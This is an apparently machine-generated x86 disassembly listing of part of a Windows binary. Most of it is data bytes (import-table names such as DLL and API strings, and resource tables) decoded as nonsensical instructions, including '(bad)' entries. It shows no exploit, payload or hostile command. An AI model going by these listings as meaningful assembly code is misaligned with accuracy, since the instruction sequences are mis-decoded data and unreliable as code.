  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	aaa    
  413c54:	inc    ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    DWORD PTR [ebx+0x0],eax
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    DWORD PTR [ebx+0x0],eax
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
